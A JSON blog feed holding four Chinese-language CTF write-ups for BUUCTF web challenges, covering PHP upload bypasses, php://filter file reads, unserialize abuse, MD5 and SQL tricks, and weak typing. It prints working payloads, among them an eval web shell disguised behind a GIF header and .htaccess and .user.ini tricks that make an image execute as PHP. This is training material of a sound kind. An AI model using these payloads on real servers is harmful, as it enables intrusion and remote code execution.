{
    "version": "https://jsonfeed.org/version/1",
    "title": "逐梦 • All posts by \"buuctf\" tag",
    "description": "Welcome to my blog",
    "home_page_url": "https://0xdadream.github.io",
    "items": [
        {
            "id": "https://0xdadream.github.io/2021/04/01/suctf-2019-checkin/",
            "url": "https://0xdadream.github.io/2021/04/01/suctf-2019-checkin/",
            "title": "SUCTF_2019 CheckIn",
            "date_published": "2021-04-01T01:50:00.000Z",
            "content_html": "<h2 id=\"SUCTF-2019-CheckIn\"><a href=\"#SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"[SUCTF 2019]CheckIn\"></a>[SUCTF 2019]CheckIn</h2><p>尝试提交<img src=\"https://images.dadream.eu.org/images/2024/07/8ccdd8b2dd28872c8b1e34d768cf32c2.png\"></p>\n<p>illegal suffix</p>\n<p>尝试修改后缀和Content-Type字段，还是不合法</p>\n<p>修改后缀为jpg，再次上传</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/f29133de19db698190c41e6d8bbf5e47.png\"></p>\n<p>不能有&lt;?，修改文件内容</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>script language<span class=\"token operator\">=</span><span class=\"token string\">\"php\"</span><span class=\"token operator\">&gt;</span>@<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/fdf7eef98ec46cbaeea6d62de0ef9343.png\"></p>\n<p>exif_imagetype函数</p>\n<p>在头部加个图片幻数</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">GIF89a\n<span class=\"token operator\">&lt;</span>script language<span class=\"token operator\">=</span><span class=\"token string\">\"php\"</span><span class=\"token operator\">&gt;</span>@<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/dbdcfd3f1258bdffd69f35011b7d5005.png\"></p>\n<p>访问图片，确实成功了</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/07204f593250b853aa043430a4d0ad21.png\"></p>\n<p>成功，但是要连接需要把它解释为php文件</p>\n<p>上传<code>.htaccess</code>文件</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">GIF89a\nSetHandler application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>httpd<span class=\"token operator\">-</span>php <span class=\"token punctuation\">.</span>jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/86dc24a0297a883bc4a81b6300efe2b3.png\"></p>\n<p>用蚁剑连接没有成功，可能中间件不是Apache</p>\n<p>可以改用上传<code>.uesr.ini</code>文件</p>\n<p>使用条件</p>\n<p>上传马的文件夹有php文件</p>\n<p>原理：存在php文件，就会向目录里查找.jpg，解析为php</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">GIF89a\nauto_prepend_file<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">.</span>jpg\n\n如果前面的马写的是\nGIF89a\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span> @<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n则加一行\nGIF89a\nauto_prepend_file<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">.</span>jpg\nasp_tags<span class=\"token operator\">=</span>on<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/a4aeaa1469ec4bcad78116819c1c34d8.png\"></p>\n<p>连接</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/333bc5f92a798a36f03ed24221b8ebf1.png\"></p>\n<p>成功，在根目录找到flag</p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/04/01/zjctf-2019-nizhuansiwei/",
            "url": "https://0xdadream.github.io/2021/04/01/zjctf-2019-nizhuansiwei/",
            "title": "ZJCTF_2019 NiZhuanSiWei",
            "date_published": "2021-03-31T18:50:00.000Z",
            "content_html": "<h2 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>进入页面便是代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n<span class=\"token variable\">$text</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"text\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"welcome to the zjctf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;&lt;h1&gt;\"</span><span class=\"token operator\">.</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Not now!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//useless.php</span>\n        <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>代码审计</p>\n<p><code>file_get_contents($text,'r')===\"welcome to the zjctf\"</code>读取$text内容与后面比较</p>\n<p><code>file_get_contents</code>可以用到伪协议</p>\n<p>enctype=”multipart/form-data” 的时候 php://input 是无效的</p>\n<p>构造payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>text<span class=\"token operator\">=</span>data<span class=\"token punctuation\">:</span>text<span class=\"token operator\">/</span>plain<span class=\"token punctuation\">,</span>welcome to the zjctf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>preg_match(\"/flag/\",$file)</code>file不能包含flag</p>\n<p><code>include($file);  //useless.php</code>包含文件</p>\n<p>payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resoure=useless.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>text<span class=\"token operator\">=</span>data<span class=\"token punctuation\">:</span>text<span class=\"token operator\">/</span>plain<span class=\"token punctuation\">,</span>welcome to the zjctf<span class=\"token operator\">&amp;</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=useless.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo<span class=\"token operator\">=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>解码的</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Flag</span><span class=\"token punctuation\">{</span>  <span class=\"token comment\">//flag.php  </span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>  \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>  \n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"U R SO CLOSE !///COME ON PLZ\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>  \n    <span class=\"token punctuation\">}</span>  \n<span class=\"token punctuation\">}</span>  \n<span class=\"token delimiter important\">?&gt;</span></span>  \n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>$password = unserialize($password);</code>反序列化函数</p>\n<p>将上面一个类序列化</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Flag\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">&amp;</span><span class=\"token number\">123</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span><span class=\"token number\">125</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>最终payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>text<span class=\"token operator\">=</span>data<span class=\"token punctuation\">:</span>text<span class=\"token operator\">/</span>plain<span class=\"token punctuation\">,</span>welcome to the zjctf<span class=\"token operator\">&amp;</span>file<span class=\"token operator\">=</span>useless<span class=\"token operator\">.</span>php<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Flag\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">&amp;</span><span class=\"token number\">123</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span><span class=\"token number\">125</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>最后ctrl+U查看flag</p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/31/bjdctf2020-easy-md5/",
            "url": "https://0xdadream.github.io/2021/03/31/bjdctf2020-easy-md5/",
            "title": "BJDCTF2020 Easy MD5",
            "date_published": "2021-03-31T15:50:00.000Z",
            "content_html": "<h2 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h2><p>查看源码</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>upload<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>leveldo4.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>GET<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>name<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>password<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>in<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>give<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n              <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>提交一个值抓包试试</p>\n<p>发现响应头中有hint</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Hint: <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'admin'</span> <span class=\"token keyword\">where</span> password<span class=\"token operator\">=</span>md5<span class=\"token punctuation\">(</span>$pass<span class=\"token punctuation\">,</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里考察md5的知识</p>\n<p><code>md5($pass,true)</code>返回$pass md5的16进制内容，输出解析就形成</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token string single-quoted-string\">'or'</span><span class=\"token number\">6</span>XXXX<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/019c33fb76d5b64fe5307f5ba48915a0.png\"></p>\n<p>被sql语句解析，就能形成拼接</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">payload\npassword<span class=\"token operator\">=</span>ffifdyop\n\n拼接后：<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'admin'</span> <span class=\"token keyword\">where</span> password<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token operator\">or</span><span class=\"token string\">'6XXXX'</span>即可绕过<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>进入levels91.php     Do You Like MD5?查看源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// wow, glzjin wants a girl friend.</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里又考察哈希碰撞，也可以用[]绕过  <code>== !=</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">payload\na<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2</span>\n<span class=\"token operator\">or</span>\na<span class=\"token operator\">=</span>s878926199a<span class=\"token operator\">&amp;</span>b<span class=\"token operator\">=</span>s155964671a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param1'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!==</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param2'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里一样，md5[]绕过 <code>=== !==</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\nparam1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>param2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>得到flag</p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/31/ji-ke-da-tiao-zhan-2019-buyflag/",
            "url": "https://0xdadream.github.io/2021/03/31/ji-ke-da-tiao-zhan-2019-buyflag/",
            "title": "极客大挑战 2019BuyFlag",
            "date_published": "2021-03-31T15:25:00.000Z",
            "content_html": "<h2 id=\"极客大挑战-2019-BuyFlag\"><a href=\"#极客大挑战-2019-BuyFlag\" class=\"headerlink\" title=\"[极客大挑战 2019]BuyFlag\"></a>[极客大挑战 2019]BuyFlag</h2><p>进入payflag页面，查看源码，得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>\n\t<span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span>post money <span class=\"token keyword\">and</span> password<span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"password can't be number&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span><span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span> <span class=\"token operator\">==</span> <span class=\"token number\">404</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Password Right!&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/375d2595c84d086e942ef033069167a4.png\"></p>\n<p>并且分析图片，得到以下信息</p>\n<p>需要传入<code>money=100000000</code>和<code>password=404</code>并且password不能被检查为数字，还需要是CUIT的学生</p>\n<p><code>password==404</code> 用到php的弱类型，<code>password=404a</code>即可绕过</p>\n<p>CUIT的学生POST参数没说，可能在报文的头里面，抓包看看</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">user=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>果然是带cookie的，将cookie的值修改为1（都行）</p>\n<p>构造payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token operator\">=</span><span class=\"token number\">404</span>a<span class=\"token operator\">&amp;</span>money<span class=\"token operator\">=</span><span class=\"token number\">100000000</span><span aria-hidden=\"true\" 